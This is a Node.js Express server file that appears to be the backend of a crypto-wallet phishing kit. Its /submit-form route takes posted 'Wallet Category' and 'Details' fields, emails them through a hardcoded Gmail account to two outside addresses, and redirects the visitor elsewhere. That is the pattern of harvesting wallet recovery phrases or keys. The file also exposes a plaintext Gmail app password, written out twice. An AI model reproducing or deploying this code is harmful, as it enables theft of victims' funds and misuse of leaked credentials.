const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const PORT = 3000;
const nodemailer = require('nodemailer');

// Parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }));

// Parse application/json
app.use(bodyParser.json());

// Allow all origins in CORS (adjust this based on your production needs)
app.use(cors());


// Define CORS headers
app.use(function(req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.header('Access-Control-Allow-Headers', '*');
    next();
});


app.use(express.json());
app.use(express.static('public'))

let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: "oliverd200x@gmail.com",
      pass: "raau ikjs coyf jqru",
    }
  });

app.post('/submit-form', (req, res) => {
    console.log(req.headers);
    const formData = req.body;

    // Customize these settings
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'oliverd200x@gmail.com',
            pass: 'raau ikjs coyf jqru',
        },
    });

    // Specify multiple recipient email addresses
    const toEmails = ['jasoncheng200x@gmail.com', 'resultsmy1@gmail.com'];

    // Send separate emails to each recipient
    toEmails.forEach((recipient) => {
        const mailOptions = {
            from: 'oliverd200x@gmail.com', // Sender's email address
            to: recipient, // Individual recipient's email address
            subject: 'New Main-net-Kits Submission',
            text: `Wallet Category: ${formData['Wallet Category']}\nDetails: ${formData.Details}`,
        };

        // Use the transporter to send the email
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.error(`Error sending email to ${recipient}:`, error);
            } else {
                console.log(`Email sent successfully to ${recipient}`);
            }
        });
    });

    // Include the redirect URL in the response
    res.status(200).json({ status: 0, redirectUrl: '/user/redirect.html' });
});

app.get('/get', (req, res) => {
    res.redirect('/user/redirect.html')
});


app.listen(PORT, (error) => {
    if (!error)
        console.log("Server is Successfully Running, and App is listening on port " + PORT)
    else
        console.log("Error occurred, server can't start", error);
});
